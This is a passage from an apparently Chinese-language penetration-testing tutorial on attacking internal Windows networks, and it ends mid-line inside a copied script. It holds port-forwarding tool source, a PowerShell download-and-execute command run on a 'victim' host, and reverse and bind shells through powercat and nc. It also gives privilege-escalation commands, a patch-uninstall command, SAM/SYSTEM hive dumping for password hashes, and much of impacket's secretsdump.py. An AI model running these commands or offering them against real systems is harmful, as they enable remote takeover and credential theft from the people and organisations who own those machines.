<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">TerminateThread(hThread, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查IP地址格式是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">checkIP</span><span class="params">(<span class="keyword">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (INADDR_NONE == inet_addr(str))</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">client_connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">char</span>* server, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">/*sock*/</span><span class="comment">/*远程IP*/</span><span class="comment">/*远程端口*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cliaddr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span>* <span class="title">host</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(host = gethostbyname(server)))<span class="comment">//获得远程主机的IP</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//   printf(&quot;[-] Gethostbyname(%s) error:%s\n&quot;,server,strerror(errno));</span></span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//给地址结构赋值</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;cliaddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr));</span><br><span class="line">cliaddr.sin_family = AF_INET;</span><br><span class="line">cliaddr.sin_port = htons(port);<span class="comment">/*远程端口*/</span></span><br><span class="line">cliaddr.sin_addr = *((struct in_addr*)host-&gt;h_addr);<span class="comment">//host ip</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//去连接远程正在listen的主机</span></span><br><span class="line"><span class="keyword">if</span> (connect(sockfd, (struct sockaddr*) &amp; cliaddr, <span class="keyword">sizeof</span>(struct sockaddr)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//        printf(&quot;[-] Connect error.\r\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">version</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;xlc v1.0 -Port Transport by Chris &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;      _     _____                    &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;__  _| | __|_   _|__  __ _ _ __ ___  &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\\ \\/ / |/ __|| |/ _ \\/ _` | &#x27;_ ` _ \\ &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &gt;  &lt;| | (__ | |  __/ (_| | | | | | |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;/_/\\_\\_|\\___||_|\\___|\\__,_|_| |_| |_|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;site:http://sec.xlcteam.com&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;usage: xlc.exe [options]&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;options:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-slave  remoteIp remotePort1  localIp  localPort&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-listen  remotePort1 remotePort2&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;e.g.:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;xlc.exe -slave  202.119.225.35 51 192.168.0.11 3389&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;xlc.exe -listen 51  33891&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h4><p>powercat是一款ps版nc。可以本地执行，也可以远程下载执行</p><p>项目地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;besimorhino&#x2F;powercat</span><br></pre></td></tr></table></figure><h5 id="参数解释-1"><a href="#参数解释-1" class="headerlink" title="参数解释"></a>参数解释</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-l      监听连接                                      [Switch]</span><br><span class="line">-c      连接到侦听器                                   [String]</span><br><span class="line">-p      要连接或监听的端口.                             [String]</span><br><span class="line">-e      执行. (GAPING_SECURITY_HOLE)                  [String]</span><br><span class="line">-ep     执行Powershell                                [Switch]</span><br><span class="line">-r      中继,格式: &quot;-r tcp:10.1.1.1:443&quot;               [String]</span><br><span class="line">-u      通过UDP传输数据                                 [Switch]</span><br><span class="line">-dns    通过dns传输数据 (dnscat2)                       [String]</span><br><span class="line">-dnsft  DNS故障阈值                                     [int32]</span><br><span class="line">-t      超时选项, 默认值: 60                             [int32]</span><br><span class="line">-i      输入：文件路径（字符串）,字节数组或字符串            [object]</span><br><span class="line">-o      控制台输出类型: &quot;Host&quot;, &quot;Bytes&quot;, or &quot;String&quot;     [String]</span><br><span class="line">-of     输出文件路径                                     [String]</span><br><span class="line">-d      连接后断开连接                                   [Switch]</span><br><span class="line">-rep    中继器,断开连接后重新启动                          [Switch]</span><br><span class="line">-g      生成有效载荷                                     [Switch]</span><br><span class="line">-ge     生成编码的有效载荷                                [Switch]</span><br></pre></td></tr></table></figure><p>这里把kali当做我们VPS服务器</p><h5 id="反向链接"><a href="#反向链接" class="headerlink" title="反向链接"></a>反向链接</h5><p>kali上面运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 4444 -vv</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/49.png?raw=true" alt="image-20200801155544855"></p><p>受害者机器上运行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;)&quot;</span></span><br><span class="line">//先导入这个模块才行不然有些机器运行是没有任何反应的</span><br><span class="line"><span class="built_in">Import-Module</span> ./powercat.ps1</span><br><span class="line">powercat <span class="literal">-c</span> <span class="number">192.168</span>.<span class="number">183.138</span> <span class="literal">-p</span> <span class="number">4444</span> <span class="literal">-v</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/50.png?raw=true" alt="image-20200801155534168"></p><p>然后我们可以用代理工具链接kali上的4444端口进行代理访问了</p><h5 id="正向链接"><a href="#正向链接" class="headerlink" title="正向链接"></a>正向链接</h5><p>受害者机器上运行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;)&quot;</span></span><br><span class="line">//先导入这个模块才行不然有些机器运行是没有任何反应的</span><br><span class="line"><span class="built_in">Import-Module</span> ./powercat.ps1</span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8888</span> <span class="literal">-e</span> cmd.exe <span class="literal">-v</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/51.png?raw=true" alt="image-20200801155337817"></p><p>kali上运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  192.168.183.145 8888 -vv</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/52.png?raw=true" alt="image-20200801155352064"></p><p>这样我们就能直接执行命令了</p><h4 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h4><p>当目标机器只开放mssql时，我们也可以利用mssql执行clr作为传输通道。</p><p>项目地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;blackarrowsec&#x2F;mssqlproxy</span><br></pre></td></tr></table></figure><p>需要环境如下</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/53.png?raw=true" alt="img"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>首先在Windows中，权限分为四类</p><table><thead><tr><th align="center"><strong>权限</strong></th><th align="center"><strong>详细</strong></th></tr></thead><tbody><tr><td align="center">User</td><td align="center">普通用户权限</td></tr><tr><td align="center">Administrator</td><td align="center">管理员权限。通常需要通过机制再提升为system权限来操作SAM（Mimikatz抓密码）</td></tr><tr><td align="center">System</td><td align="center">系统权限。可以操作SAM，需要从Administrator提升到SAM才能对散列值Dump</td></tr><tr><td align="center">TrustedInstaller</td><td align="center">最高权限，可以操作系统文件</td></tr></tbody></table><p>利用kb编号查询相关CVE网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;bugs.hacking8.com&#x2F;tiquan&#x2F;</span><br></pre></td></tr></table></figure><p>利用MSF查询可利用提权漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br></pre></td></tr></table></figure><p>还可以卸载kb补丁</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wusa /uninstall /kb:XXXXXXX</span><br></pre></td></tr></table></figure><h3 id="Administrator提权到SYSTEM"><a href="#Administrator提权到SYSTEM" class="headerlink" title="Administrator提权到SYSTEM"></a>Administrator提权到SYSTEM</h3><h4 id="at本地命令提权"><a href="#at本地命令提权" class="headerlink" title="at本地命令提权"></a>at本地命令提权</h4><p>适用于Windows2000、Windows 2003、Windows XP这三个系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#at 时间 命令</span><br><span class="line">at 20:45 calc.exe</span><br><span class="line">#开启交互式的cmd</span><br><span class="line">at 20:45 &#x2F;interactive cmd.exe</span><br></pre></td></tr></table></figure><h4 id="sc命令提权"><a href="#sc命令提权" class="headerlink" title="sc命令提权"></a>sc命令提权</h4><p>适用于Windows 7、Windows 8、Windows Server 03、Windows Server  08、Windows Server  12、Windows Server 16</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath&#x3D; &quot;cmd &#x2F;K start&quot; type&#x3D; own type&#x3D; interact</span><br></pre></td></tr></table></figure><h3 id="CVE漏洞提权"><a href="#CVE漏洞提权" class="headerlink" title="CVE漏洞提权"></a>CVE漏洞提权</h3><p>单独写一篇文章主要是内容太多了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ascotbe.com&#x2F;2020&#x2F;08&#x2F;10&#x2F;WindowsKernelExploits&#x2F;</span><br></pre></td></tr></table></figure><h2 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h2><p>密码抓取已经成为渗透中必不可少的一项技能。一个管理员很可能管理着N多台机器，但是密码使用的都是同一个或者是有规律的。如果抓到一台机器的密码，利用同密码碰撞，很可能这个渗透项目就结束了。</p><h3 id="密码组成"><a href="#密码组成" class="headerlink" title="密码组成"></a>密码组成</h3><p>我们经常看到的hash长这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><p>他的组成就是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user:sid:lmhash:ntlmhash</span><br></pre></td></tr></table></figure><p>lmhash的加密流程如下：</p><p>1、密码长度限制为14个字符</p><p>2、密码全部转换为大写</p><p>3、密码转换为16进制字符串，不足14字节用0补全</p><p>4、密码的16进制字符串被分成两个7byte部分</p><p>5、再分7bit为一组,每组末尾加0，再组成一组</p><p>6、上步骤得到的二组，分别作为key 为 <code>KGS!@#$%</code>进行DES加密。</p><p>7、将加密后的两组拼接在一起，得到最终LM HASH值。</p><p>为了解决LM加密和身份验证方案固有的安全漏洞，Microsoft 于1993年在Windows NT 3.1中引入了NTLMv1协议(ntlmhash)。对于散列，NTLM使用Unicode支持，替换为，不需要任何填充或截断操作即可简化密钥。</p><p>1、先将用户密码转换为十六进制格式。</p><p>2、将十六进制格式的密码进行Unicode编码。</p><p>3、使用MD4对Unicode编码数据进行Hash计算</p><p>因为在vista后不再支持lmhash，因此抓到的hash中的lmhash都是<code>aad3b435b51404eeaad3b435b51404ee</code></p><p>在hash传递攻击时，可以替换成0：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>再看下ntlm认证的过程</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/54.png?raw=true" alt="img"></p><p>他的简述流程如下：</p><p>1、客户端向服务端发起认证</p><p>2、服务器收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。并使用登录用户密码hash加密Challenge，获得Challenge1</p><p>3、客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器</p><p>4、服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功。</p><p>上述中的response类似于下面这样：</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/55.png?raw=true" alt="img"></p><p>上述中的response就可以理解为net-ntlmhash，因此ntlmhash我们是可以拿来hash传递的，而net-ntlmhash不可以，但是net-ntlmhash也可以拿来做破解和relay。</p><h3 id="本地提取"><a href="#本地提取" class="headerlink" title="本地提取"></a>本地提取</h3><p>在windows上的<strong>C:\Windows\System32\config</strong>目录保存着当前用户的密码hash。我们可以使用相关手段获取该hash。</p><p><strong>提取的时候需要管理员权限，普通权限没办法提取出来</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用reg命令获取本地用户凭据hash</span></span><br><span class="line">reg  save  hklm\sam sam.hive</span><br><span class="line">reg  save hklm\system system.hive</span><br><span class="line">reg  save hklm\security security.hive</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/56.png?raw=true" alt="image-20200803150511319"></p><p>然后用下面这个项目解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket&#x2F;blob&#x2F;master&#x2F;examples&#x2F;secretsdump.py</span><br></pre></td></tr></table></figure><p>防止丢失我就把代码拷贝过来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> impacket <span class="keyword">import</span> version</span><br><span class="line"><span class="keyword">from</span> impacket.examples <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> impacket.smbconnection <span class="keyword">import</span> SMBConnection</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> impacket.examples.secretsdump <span class="keyword">import</span> LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes</span><br><span class="line"><span class="keyword">from</span> impacket.krb5.keytab <span class="keyword">import</span> Keytab</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">input</span> = raw_input</span><br><span class="line"><span class="keyword">except</span> NameError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DumpSecrets</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, remoteName, username=<span class="string">&#x27;&#x27;</span>, password=<span class="string">&#x27;&#x27;</span>, domain=<span class="string">&#x27;&#x27;</span>, options=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.__useVSSMethod = options.use_vss</span><br><span class="line">        self.__remoteName = remoteName</span><br><span class="line">        self.__remoteHost = options.target_ip</span><br><span class="line">        self.__username = username</span><br><span class="line">        self.__password = password</span><br><span class="line">        self.__domain = domain</span><br><span class="line">        self.__lmhash = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.__nthash = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.__aesKey = options.aesKey</span><br><span class="line">        self.__smbConnection = <span class="literal">None</span></span><br><span class="line">        self.__remoteOps = <span class="literal">None</span></span><br><span class="line">        self.__SAMHashes = <span class="literal">None</span></span><br><span class="line">        self.__NTDSHashes = <span class="literal">None</span></span><br><span class="line">        self.__LSASecrets = <span class="literal">None</span></span><br><span class="line">        self.__systemHive = options.system</span><br><span class="line">        self.__bootkey = options.bootkey</span><br><span class="line">        self.__securityHive = options.security</span><br><span class="line">        self.__samHive = options.sam</span><br><span class="line">        self.__ntdsFile = options.ntds</span><br><span class="line">        self.__history = options.history</span><br><span class="line">        self.__noLMHash = <span class="literal">True</span></span><br><span class="line">        self.__isRemote = <span class="literal">True</span></span><br><span class="line">        self.__outputFileName = options.outputfile</span><br><span class="line">        self.__doKerberos = options.k</span><br><span class="line">        self.__justDC = options.just_dc</span><br><span class="line">        self.__justDCNTLM = options.just_dc_ntlm</span><br><span class="line">        self.__justUser = options.just_dc_user</span><br><span class="line">        self.__pwdLastSet = options.pwd_last_set</span><br><span class="line">        self.__printUserStatus= options.user_status</span><br><span class="line">        self.__resumeFileName = options.resumefile</span><br><span class="line">        self.__canProcessSAMLSA = <span class="literal">True</span></span><br><span class="line">        self.__kdcHost = options.dc_ip</span><br><span class="line">        self.__options = options</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> options.hashes <span class="keyword">is</span> <span 